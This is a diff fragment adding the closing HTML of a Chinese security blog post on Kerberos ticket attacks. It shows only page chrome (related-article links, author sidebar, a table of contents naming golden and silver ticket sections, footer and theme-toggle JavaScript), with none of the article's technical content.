+            theme="github-light"
+            crossorigin="anonymous"
+            async>
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="https://github.com/utterance">comments powered by utterances.</a></noscript>
+
+  
+        </div>
+
+        <div class="related my-5">
+            
+
+
+<div class="p-8 mt-6 lg:mt-0 rounded shadow bg-white dark:bg-gray-800">
+    <h2 class="font-sans font-bold break-normal text-gray-700 px-2 pb-3 text-xl dark:text-gray-300">相关文章</h2>
+    
+    <li><a href="/ad_spn.html" class="underline text-yellow-600">域渗透-SPN</a></li>
+    
+    <li><a href="/ad_kerberoasting.html" class="underline text-yellow-600">域渗透-Kerberoasting</a></li>
+    
+    <li><a href="/ad_as_reproasting.html" class="underline text-yellow-600">域渗透-AS_REPRoasting</a></li>
+    
+    <li><a href="/ad_pass_key.html" class="underline text-yellow-600">域渗透-哈希传递攻击(Pass The Hash/Key)</a></li>
+    
+    <li><a href="/kerberos_user_enumerate.html" class="underline text-yellow-600">域渗透-用户名枚举</a></li>
+    
+</div>
+
+        </div>
+
+    
+
+</section>
+
+
+<div class="hidden xl:text-sm xl:block xl:w-1/4 xl:px-6 ">
+
+    <div class="lg:w-full mx-auto items-center justify-between">
+    <div class="bg-white shadow rounded overflow-hidden dark:bg-gray-800">
+        <div class="bg-cover mx-auto w-32 h-32 mt-5 rounded-full" style="background-image: url('https://avatars.githubusercontent.com/u/16066632?v=4')"> </div>
+        
+        <div class="p-4">
+            <p class="text-2xl text-center pb-2">F0rmat</p>
+            <p class="text-sm text-center text-gray-700 dark:text-gray-300">专注于信息安全、内网渗透、红队攻防</p>
+        </div>
+        <div class="flex p-4 border-t text-sm border-gray-300 text-gray-700 dark:text-gray-300">
+            <div class="flex-1 border-r border-gray-600">
+                <p class="text-center">
+                    <span class="font-bold ">
+                        85
+                    </span>
+                    文章
+                </p>
+            </div>
+            <div class="flex-1 text-center">
+                <p class="text-center">
+                    <span class="font-bold">
+                        
+                            60
+                        
+                    </span>
+                    标签
+                </p>
+            </div>
+        </div>
+        <div class="px-4 pb-4 border-t border-gray-300 dark:text-gray-200">
+            <div class="mt-6 pb-16 lg:pb-0 w-4/5 lg:w-full mx-auto flex flex-wrap items-center  text-gray-500">
+                
+                <a href="//github.com/Secd0g" class="hover:text-gray-900 dark:hover:text-gray-100 p-1 text-2xl" target="_blank" title="GitHub"><i class="my-iconfont icon-social-github"></i></a>
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+                
+                <a href="//zhihu.com/people/F0rmat" class="hover:text-gray-900 dark:hover:text-gray-100 p-1 text-2xl" target="_blank" title="zhihu"><i><svg xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 640 512"><style>svg{fill:#bac5d8}</style><path d="M170.54 148.13v217.54l23.43.01 7.71 26.37 42.01-26.37h49.53V148.13H170.54zm97.75 193.93h-27.94l-27.9 17.51-5.08-17.47-11.9-.04V171.75h72.82v170.31zm-118.46-94.39H97.5c1.74-27.1 2.2-51.59 2.2-73.46h51.16s1.97-22.56-8.58-22.31h-88.5c3.49-13.12 7.87-26.66 13.12-40.67 0 0-24.07 0-32.27 21.57-3.39 8.9-13.21 43.14-30.7 78.12 5.89-.64 25.37-1.18 36.84-22.21 2.11-5.89 2.51-6.66 5.14-14.53h28.87c0 10.5-1.2 66.88-1.68 73.44H20.83c-11.74 0-15.56 23.62-15.56 23.62h65.58C66.45 321.1 42.83 363.12 0 396.34c20.49 5.85 40.91-.93 51-9.9 0 0 22.98-20.9 35.59-69.25l53.96 64.94s7.91-26.89-1.24-39.99c-7.58-8.92-28.06-33.06-36.79-41.81L87.9 311.95c4.36-13.98 6.99-27.55 7.87-40.67h61.65s-.09-23.62-7.59-23.62v.01zm412.02-1.6c20.83-25.64 44.98-58.57 44.98-58.57s-18.65-14.8-27.38-4.06c-6 8.15-36.83 48.2-36.83 48.2l19.23 14.43zm-150.09-59.09c-9.01-8.25-25.91 2.13-25.91 2.13s39.52 55.04 41.12 57.45l19.46-13.73s-25.67-37.61-34.66-45.86h-.01zM640 258.35c-19.78 0-130.91.93-131.06.93v-101c4.81 0 12.42-.4 22.85-1.2 40.88-2.41 70.13-4 87.77-4.81 0 0 12.22-27.19-.59-33.44-3.07-1.18-23.17 4.58-23.17 4.58s-165.22 16.49-232.36 18.05c1.6 8.82 7.62 17.08 15.78 19.55 13.31 3.48 22.69 1.7 49.15.89 24.83-1.6 43.68-2.43 56.51-2.43v99.81H351.41s2.82 22.31 25.51 22.85h107.94v70.92c0 13.97-11.19 21.99-24.48 21.12-14.08.11-26.08-1.15-41.69-1.81 1.99 3.97 6.33 14.39 19.31 21.84 9.88 4.81 16.17 6.57 26.02 6.57 29.56 0 45.67-17.28 44.89-45.31v-73.32h122.36c9.68 0 8.7-23.78 8.7-23.78l.03-.01z"/></svg></i></a>
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+                <a href="/atom.xml" class="hover:text-gray-900 dark:hover:text-gray-100 p-1 text-2xl" target="_blank" title="RSS"><i class="my-iconfont icon-feed"></i></a>
+                
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+
+
+
+
+    <div class="flex flex-col justify-between sticky top-0 pt-12 pb-4 -mt-10 text-gray-600 dark:text-gray-400">
+        <div class="bg-white shadow rounded p-4 mt-5 dark:bg-gray-800">
+            
+<p class="text-base font-bold py-2 yg:pb-6 text-gray-700 dark:text-gray-300">文章目录</p>
+    <div class="sticky text-sm" style="top:6em;" id="menu-content">
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#0x00-前言">0x00 前言</a></li>
+    <li><a href="#0x01-简介">0x01 简介</a></li>
+    <li><a href="#0x02-票据传递">0x02 票据传递</a>
+      <ul>
+        <li><a href="#基本原理">基本原理</a></li>
+        <li><a href="#实战">实战</a></li>
+      </ul>
+    </li>
+    <li><a href="#0x03-黄金票据golden-ticket">0x03 黄金票据（Golden Ticket）</a>
+      <ul>
+        <li><a href="#基本原理-1">基本原理</a></li>
+        <li><a href="#实战-1">实战</a>
+          <ul>
+            <li><a href="#mimikatz">Mimikatz</a></li>
+            <li><a href="#impacket">Impacket</a></li>
+          </ul>
+    </li>
+    <li><a href="#0x04-白银票据silver-ticket">0x04 白银票据（Silver Ticket）</a>
+      <ul>
+        <li><a href="#基本原理-2">基本原理</a></li>
+        <li><a href="#与黄金票据的区别">与黄金票据的区别</a>
+          <ul>
+            <li><a href="#访问权限不同">访问权限不同</a></li>
+            <li><a href="#加密方式不同">加密方式不同</a></li>
+            <li><a href="#认证流程不同">认证流程不同</a></li>
+            <li><a href="#共同点">共同点</a></li>
+          </ul>
+        </li>
+        <li><a href="#利用条件">利用条件</a></li>
+        <li><a href="#实战-2">实战</a>
+          <ul>
+            <li><a href="#伪造cifs服务权限">伪造CIFS服务权限</a></li>
+            <li><a href="#伪造ldap服务权限">伪造LDAP服务权限</a></li>
+          </ul>
+    </li>
+    <li><a href="#0x05-防御">0x05 防御</a></li>
+    <li><a href="#0x06-参考">0x06 参考</a></li>
+  </ul>
+</nav>
+    </div>
+
+        </div>
+    </div>
+   
+</div> 
+
+    </div>
+    
+    
+<footer class="bg-white dark:bg-gray-800 border-gray-400 shadow mt-10">	
+    <div class="container  mx-auto flex py-8">
+        <div class="w-full text-center text-gray-600 dark:text-gray-400">
+            <p>
+                &copy; 2023 <a  class="text-gray-700 dark:text-gray-300 font-semibold" href="https://xxe.icu">F0rmat&#39;s Blog</a> By F0rmat 
+            </p>
+            
+            <p class="pt-1">
+                Powered by <a rel="nofollow noreferer noopener" href="https://gohugo.io/"  class="text-gray-700 dark:text-gray-300 font-semibold" target="_blank">Hugo</a> 
+                Theme based on <a href="https://github.com/forecho/hugo-theme-echo" class="text-gray-700 dark:text-gray-300 font-semibold" target="_blank">Echo</a>
+            </p>
+
+            <span id="busuanzi_container">
+              访客数：<span id="busuanzi_value_site_uv"></span> | 访问量 <span id="busuanzi_value_site_pv"></span>
+            </span>
+
+        </div>
+
+    </div>
+    
+   
+    
+<script src="/js/clipboard.min.js"></script>
+   
+
+</footer>
+
+ <script>
+  window.onload = function() {
+    document.getElementById("nav-toggle").onclick = function() {
+      document.getElementById("nav-content").classList.toggle("hidden");
+    };
+
+    var donate = document.getElementById("btn-donate");
+    if (donate) {
+      donate.onclick = function() {
+        document.getElementById("donate-image").classList.remove("hidden");
+        donate.classList.add("hidden");
+      };
+    }
+
+    var hostname = window.location.hostname;
+    var divs = document.querySelectorAll('a[href^="http"]');
+    [].forEach.call(divs, function(div) {
+      url = div.getAttribute("href");
+      var domain = url
+        .replace("http://", "")
+        .replace("https://", "")
+        .split(/[/?#:]/)[0];
+      if (domain !== hostname) {
+        div.setAttribute("target", "_blank");
+      }
+    });
+  };
+
+   
+  
+  var h = document.documentElement,
+    b = document.body,
+    st = "scrollTop",
+    sh = "scrollHeight",
+    progress = document.querySelector("#progress"),
+    scroll;
+  var scrollpos = window.scrollY;
+  var header = document.getElementById("header");
+  var navcontent = document.getElementById("nav-content");
+
+  document.addEventListener("scroll", function() {
+     
+    scroll = ((h[st] || b[st]) / ((h[sh] || b[sh]) - h.clientHeight)) * 100;
+    progress.style.setProperty("--scroll", scroll + "%");
+
+     
+    scrollpos = window.scrollY;
+
+    if (scrollpos > 10) {
+      navcontent.classList.remove("bg-gray-100");
+    } else {
+      navcontent.classList.add("bg-gray-100");
+    }
+  });
+
+  
+  if (localStorage.theme === 'dark' || (!'theme' in localStorage && window.matchMedia('(prefers-color-scheme: dark)').matches)) {
+      var lightIcon = document.getElementById("light-icon");
+      var darkIcon = document.getElementById("dark-icon"); 
+      lightIcon.classList.add("hidden");
+      darkIcon.classList.remove("hidden");
+      document.querySelector('html').classList.add('dark')
+  }
+
+  document.getElementById('switchTheme').addEventListener('click', function() {
+    let htmlClasses = document.querySelector('html').classList;
+    var lightIcon = document.getElementById("light-icon");
+    var darkIcon = document.getElementById("dark-icon");
+    if(localStorage.theme == 'dark') {
+        htmlClasses.remove('dark');
+        localStorage.removeItem('theme');
+        darkIcon.classList.add("hidden");
+        lightIcon.classList.remove("hidden");
+    } else {
+        htmlClasses.add('dark');
+        lightIcon.classList.add("hidden");
+        darkIcon.classList.remove("hidden");
+        localStorage.theme = 'dark';
+    }
+  });
+</script>
+
+</body>
+
+</html>
